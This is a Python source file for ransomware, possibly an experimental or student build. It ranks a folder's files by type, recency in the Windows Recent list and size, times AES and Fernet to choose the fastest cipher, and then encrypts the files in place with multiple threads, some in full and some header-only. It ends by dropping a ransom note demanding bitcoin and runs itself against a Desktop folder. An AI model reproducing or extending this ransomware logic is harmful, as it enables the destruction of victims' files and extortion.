import datetime
import os
import tempfile
import time
import timeit
import glob
from tabulate import tabulate

import concurrent.futures

import AES
import Affine
import Fernet

ciphers = {
    "AES": {"encrypt_file": AES.encrypt_file, "args": (AES.aes_key,)},
    "Fernet": {"encrypt_file": Fernet.encrypt_file, "args": (Fernet.key,)},
}

ciphers_for_header = {
    "AES_header_only": {
        "encrypt_file": AES.encrypt_header_aes,
        "args": (AES.aes_key,),
        "header_size": 100, 
    },
    # "Affine_header_only": {
    #     "encrypt_file": Affine.encrypt_header_affine,
    #     "args": (Affine.a, Affine.b),
    #     "header_size": 100,
    # },
    "Fernet_header_only": {
        "encrypt_file": Fernet.encrypt_header_fernet,
        "args": (Fernet.key,),
        "header_size": 100,
    },
}

def priortize_files(directory_to_check, types_to_ignore=[], size_limit_mb=200, priority_limit=3):
    """Check files in the specified directory for encryption."""


    recent_files_dir = glob.glob(
        os.path.join(os.getenv("AppData"), "Microsoft", "Windows", "Recent", "*.*")
    )

    recent_files_names = {
        os.path.splitext(os.path.basename(file))[0] for file in recent_files_dir
    }

    
    extension_priority = {
        "docx": 1,
        "xlsx": 1,
        "txt": 1,
        "html": 1,
        "csv": 1,
        "txt": 1,
        "md": 2,
        "xls": 1,
        "pdf": 2,
        "jpg": 3,
        "pptx": 5,
        "png": 3,
        "mp4": 4,
        "mp3": 5,
        "zip": 4,
        "7z": 6,
        "rar": 4,
    }

    headers = [
        "File",
        "Type",
        "Size (MB)",
        "Last Accessed",
        "In Recent Documents",
        "To Encrypt",
        "Encrypt Header Only",
        "Priority"
    ]
    rows = []

    ready_for_encryption = []

    for filename in os.listdir(directory_to_check):
        file_path = os.path.join(directory_to_check, filename)

        if os.path.isfile(file_path):
            to_encrypt = False
            encrypt_header_only = False

            file_type = os.path.splitext(filename)[1].lower()[1:]
            file_size_mb = round(os.path.getsize(file_path) / (1024 * 1024), 2)
            last_accessed = datetime.datetime.fromtimestamp(os.path.getatime(file_path))
            is_recent = filename in recent_files_names


            if is_recent and file_size_mb < size_limit_mb:
                to_encrypt = True
                
            if file_type in extension_priority and file_type not in types_to_ignore:
                if extension_priority[file_type] <= priority_limit:
                    to_encrypt = True
                else:
                    to_encrypt = False
                    encrypt_header_only = True

            if file_type not in extension_priority:
                to_encrypt = False
                encrypt_header_only = True

            if file_size_mb > size_limit_mb:
                to_encrypt = False
                encrypt_header_only = True

            if file_type in types_to_ignore:
                print(file_type)
                to_encrypt = False
                encrypt_header_only = False

            priority = extension_priority.get(file_type, 5)

            ready_for_encryption.append(
                (
                    filename,
                    file_path,
                    file_type,
                    file_size_mb,
                    last_accessed,
                    is_recent,
                    to_encrypt,
                    encrypt_header_only,
                    priority
                )
            )

    rows = [
        [f[0], f[2], f[3], f[4].strftime("%Y-%m-%d %H:%M:%S"), f[5], f[6], f[7], f[8]]
        for f in ready_for_encryption
    ]

    print(tabulate(rows, headers=headers, tablefmt="fancy_grid"))

    return [f[1] for f in ready_for_encryption if f[6]], [
        f[1] for f in ready_for_encryption if f[7]
    ]


def encryption_time_estimate(file_path, output_path, cipher_func, *args):
    """
    Encrypts the file using the provided cipher function and returns the encryption time.
    """
    start_time = time.time()
    cipher_func(file_path, output_path, *args)
    end_time = time.time()
    return end_time - start_time


def encrypt_files(files_to_encrypt, headers_to_encrypt):
    """
    Encrypts each file using multiple ciphers and returns the best one based on the least time required.
    """
    encryption_results = []

    enc_dir = os.path.join("encrypted_files")  
    os.makedirs(enc_dir, exist_ok=True)
    encryption_results.extend(encrypt_full_files(files_to_encrypt, enc_dir))
    encryption_results.extend(encrypt_header_only(headers_to_encrypt, enc_dir))

    print(tabulate(encryption_results, headers="keys", tablefmt="fancy_grid"))

    return encryption_results

def encrypt_full_files(files_to_encrypt, enc_dir):
    """
    Encrypts regular files and returns encryption results.
    """
    encryption_results = []

    for file_path in files_to_encrypt:
            file_name = os.path.basename(file_path)
            file_size_mb = round(os.path.getsize(file_path) / (1024 * 1024), 2)

            encryption_times = [
                encryption_time_estimate(
                    file_path,
                    f"{enc_dir}/{file_name}_{cipher_name.lower()}.enc",
                    cipher["encrypt_file"],
                    *cipher["args"],
                )
                for cipher_name, cipher in ciphers.items()
            ]
            print(f"Finding the best cipher for: {file_name}")
            min_time = min(encryption_times)
            best_cipher = list(ciphers.keys())[encryption_times.index(min_time)]

            encryption_results.append(
                {
                    "File": file_name,
                    "Size (MB)": file_size_mb,
                    "Best Cipher": best_cipher,
                    "Encryption Time (s)": min_time,
                }
            )

    return encryption_results


def header_encryption_time_estimate(file_path, cipher_func, output_file=None, *args):
    """
    Encrypts the file using the provided cipher function and returns the encryption time.
    """
    start_time = time.time()
    cipher_func(file_path, *args, output_file)
    end_time = time.time()
    return end_time - start_time

def encrypt_header_only(files_to_encrypt, enc_dir):
    """
    Encrypts regular files and returns encryption results.
    """
    encryption_results = []

    for file_path in files_to_encrypt:
        file_name = os.path.basename(file_path)
        file_size_mb = round(os.path.getsize(file_path) / (1024 * 1024), 2)

        output_file = os.path.join(enc_dir, f"{file_name}_.enc")
        encryption_times = [
            header_encryption_time_estimate(
                file_path,
                cipher["encrypt_file"],
                output_file,
                *cipher["args"],
                cipher["header_size"],
            )
            for cipher_name, cipher in ciphers_for_header.items()
        ]
        print(f"Finding the best cipher for: {file_name}")

        min_time = min(encryption_times)
        best_cipher = list(ciphers_for_header.keys())[encryption_times.index(min_time)]

        encryption_results.append(
            {
                "File": file_name,
                "Size (MB)": file_size_mb,
                "Best Cipher": best_cipher,
                "Encryption Time (s)": min_time,
            }
        )

    return encryption_results


def encrypt_files_with_best_cipher(folder_path, encryption_results):
    ciphers_combined = {**ciphers, **ciphers_for_header} 

    def encrypt_file(file_info):
        file_name = file_info["File"]
        best_cipher = file_info["Best Cipher"]
        file_path_to_encrypt = os.path.join(folder_path, file_name)
        print(f"Encrypting: {file_name} with {best_cipher}")
        if os.path.exists(file_path_to_encrypt):
            if best_cipher in ciphers_combined: 
                cipher_info = ciphers_combined[best_cipher]
                cipher_func = cipher_info["encrypt_file"]
                output_file_path = os.path.join(
                    f"{folder_path}", f"{file_name}"
                )
                key_args = cipher_info["args"]
                if "header_size" in cipher_info:  
                    header_size = cipher_info["header_size"]
                    cipher_func(
                        file_path_to_encrypt, *key_args, header_size
                    )
                else:
                    cipher_func(file_path_to_encrypt, output_file_path, *key_args)
            else:
                print(f"Unknown cipher '{best_cipher}' for file '{file_name}'")
        else:
            print(f"File '{file_name}' does not exist in the folder.")

    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(encrypt_file, encryption_results)

    print("Encryption done.")

def encrypt_files_with_best_cipher2(folder_path, encryption_results):
    ciphers_combined = {**ciphers, **ciphers_for_header} 

    for file_info in encryption_results:
        file_name = file_info["File"]
        best_cipher = file_info["Best Cipher"]
        file_path_to_encrypt = os.path.join(folder_path, file_name)
        print(f"Encrypting: {file_name} with {best_cipher}")
        if os.path.exists(file_path_to_encrypt):
            if best_cipher in ciphers_combined: 
                cipher_info = ciphers_combined[best_cipher]
                cipher_func = cipher_info["encrypt_file"]
                output_file_path = os.path.join(
                    f"{folder_path}", f"{file_name}"
                )
                key_args = cipher_info["args"]
                if "header_size" in cipher_info:  
                    header_size = cipher_info["header_size"]
                    cipher_func(
                        file_path_to_encrypt, *key_args, header_size
                    )
                else:
                    cipher_func(file_path_to_encrypt, output_file_path, *key_args)
            else:
                print(f"Unknown cipher '{best_cipher}' for file '{file_name}'")
        else:
            print(f"File '{file_name}' does not exist in the folder.")

    print("Encryption done.")

def ransom_note(file_path):
    ransom_note_content = (
        "## EncrYPted HQHQHQHQ\n\n"
        "To dEcrypt them, you must send some bitCOins.\n\n"
        "> Remember, we've always defined ourselves by the ability to overcome the impossible, (this ain't impossible tho qhqh)\n\n"
    )
    with open(file_path, "w") as ransom_note_file:
        ransom_note_file.write(ransom_note_content)



def run_file(directory_to_check):
    priortized_files, only_header = priortize_files(directory_to_check, ["exe", "iso"], 50)

    encryption_results = encrypt_files(priortized_files, only_header)
    
    encryption_time_sum = sum(result["Encryption Time (s)"] for result in encryption_results)
    print(f"Estimated Encryption Time (s): {encryption_time_sum:.2f} \n")

    print("Starting Encryption\n")        
    stime = time.time()
    encrypt_files_with_best_cipher(directory_to_check, encryption_results)
    etime = time.time()
    print(f"\nTotal Encryption time taken: {etime - stime:.3f} seconds")
   
    # print("Starting Encryption\n")        
    # stime = time.time()
    # encrypt_files_with_best_cipher2(directory_to_check, encryption_results)
    # etime = time.time()
    # print(f"\nTotal Encryption time taken: {etime - stime:.3f} seconds")
    
    ransom_note(f"{directory_to_check}/README_PLEASE_HEHE.txt")

# run_file(r"files")
run_file(r"C:\Users\intag\Desktop\temp")